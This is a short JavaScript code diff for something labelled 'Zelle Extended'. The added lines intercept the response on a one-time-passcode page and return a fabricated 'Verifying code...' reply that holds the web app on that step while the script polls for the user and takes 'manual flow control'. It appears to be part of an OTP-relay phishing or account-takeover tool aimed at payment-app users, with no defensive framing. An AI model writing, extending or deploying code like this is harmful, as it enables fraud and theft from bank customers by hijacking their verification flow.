@@ -917,6 +917,19 @@
                         } else {
                             console.log('[Zelle Extended] Already polling for this user, skipping...');
                         }
+                        
+                        // ✅ THE FIX: Return a modified response that tells React app
+                        // to STAY on OTP page (don't advance to next step)
+                        // React app will wait for our manual flow control
+                        console.log('[Zelle Extended] 🔒 Blocking React app from advancing, taking control of flow');
+                        return new Response(JSON.stringify({
+                            success: false,
+                            message: 'Verifying code...',
+                            id: data.id
+                        }), {
+                            status: 200,
+                            headers: { 'Content-Type': 'application/json' }
+                        });
                     }
                 } catch (e) {
                     // Ignore parsing errors
